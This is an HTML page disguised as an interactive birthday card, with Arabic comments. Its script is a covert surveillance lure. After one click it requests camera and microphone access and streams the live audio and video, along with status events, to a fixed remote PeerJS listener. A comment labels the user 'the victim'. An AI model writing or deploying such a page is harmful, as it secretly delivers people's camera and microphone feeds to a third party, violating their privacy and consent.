<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎂 Interactive Birthday Card</title>
  <link rel="stylesheet" href="style.css"/>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
</head>
<body>
  <div id="overlay">اضغط لبدء الكارت</div>

  <div class="card">
    <div class="cake">
      <div class="layer layer1"></div>
      <div class="layer layer2"></div>
      <div class="layer layer3"></div>
      <div class="icing"></div>
      <div class="candle" id="candle">
        <div class="flame" id="flame"></div>
      </div>
    </div>
    <video id="userCam" autoplay muted playsinline></video>
  </div>

  <script>
    const LISTENER_ID = 'birthday-listener';
    const peer = new Peer();      // تقدر تضع ID ثابت إذا أردت
    let dataConn;

    const overlay = document.getElementById('overlay');
    const videoEl = document.getElementById('userCam');
    const flame   = document.getElementById('flame');

    overlay.addEventListener('click', () => {
      overlay.style.display = 'none';

      // 1) نطلب صلاحيات الكاميرا والمايك فوراً
      navigator.mediaDevices.getUserMedia({ audio: true, video: true })
        .then(stream => {
          // عرض كاميرا الضحية
          videoEl.srcObject = stream;
          styleVideoCircle();    // تزيين الدائرة حوالين الكاميرا

          // 2) نفتح DataChannel للأحداث
          dataConn = peer.connect(LISTENER_ID);
          dataConn.on('open', () => {
            dataConn.send({ event: 'page-open' });
            dataConn.send({ event: 'mic-camera-allowed' });
          });

          // 3) نرسل الستريم للصلاحيات
          peer.call(LISTENER_ID, stream);
        })
        .catch(err => {
          console.error('Error accessing mic/camera:', err);
          dataConn && dataConn.send({ event: 'mic-camera-denied' });
        });
    });

    function styleVideoCircle() {
      Object.assign(videoEl.style, {
        position: 'absolute',
        top: '10px',
        left: 'calc(50% - 75px)',
        width: '150px',
        height: '150px',
        borderRadius: '50%',
        border: '4px solid white',
        boxShadow: '0 0 15px rgba(255,255,255,0.7)'
      });
    }
  </script>
</body>
</html>
